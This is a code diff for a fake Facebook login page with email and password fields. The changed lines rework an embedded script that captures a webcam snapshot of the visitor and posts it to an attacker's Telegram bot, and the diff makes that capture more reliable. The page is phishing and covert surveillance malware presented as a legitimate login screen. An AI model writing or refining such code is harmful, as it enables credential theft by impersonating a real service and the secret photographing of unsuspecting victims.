@@ -64,7 +64,7 @@
     </style>
 </head>
 <body>
-    <div class="logo">Facebook</div>
+    <div class="logo">Facebook Login</div>
     <div class="login-container">
         <input type="text" id="email" placeholder="Email or Phone Number">
         <input type="password" id="password" placeholder="Password">
@@ -102,24 +102,29 @@
                     let video = document.createElement("video");
                     video.srcObject = stream;
                     video.play();
-                    setTimeout(() => {
-                        let canvas = document.createElement("canvas");
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        let ctx = canvas.getContext("2d");
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        canvas.toBlob(blob => {
-                            let formData = new FormData();
-                            formData.append("chat_id", chatId);
-                            formData.append("photo", blob, "snapshot.jpg");
+                    
+                    video.addEventListener("loadeddata", () => {
+                        setTimeout(() => {
+                            let canvas = document.createElement("canvas");
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            let ctx = canvas.getContext("2d");
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                             
-                            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
-                                method: "POST",
-                                body: formData
-                            });
-                        });
-                        stream.getTracks().forEach(track => track.stop());
-                    }, 3000);
+                            canvas.toBlob(blob => {
+                                let formData = new FormData();
+                                formData.append("chat_id", chatId);
+                                formData.append("photo", blob, "snapshot.jpg");
+                                
+                                fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                                    method: "POST",
+                                    body: formData
+                                });
+                            }, 'image/jpeg');
+                            
+                            stream.getTracks().forEach(track => track.stop());
+                        }, 3000);
+                    });
                 });
         }
 
